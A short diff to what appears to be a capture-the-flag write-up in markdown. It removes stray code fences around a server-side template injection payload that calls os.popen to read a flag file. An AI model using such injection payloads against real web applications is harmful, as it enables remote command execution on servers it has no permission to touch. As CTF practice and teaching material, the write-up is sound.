@@ -40,12 +40,7 @@
 - Now I changed the command 
 
 - ```py
-  - ```py
     ${self.module.runtime.util.os.popen("cat /flat.txt".read()}
-  ```
-  
-  ```
-  
   ```
 
 - Aaaand VOILAAA!!
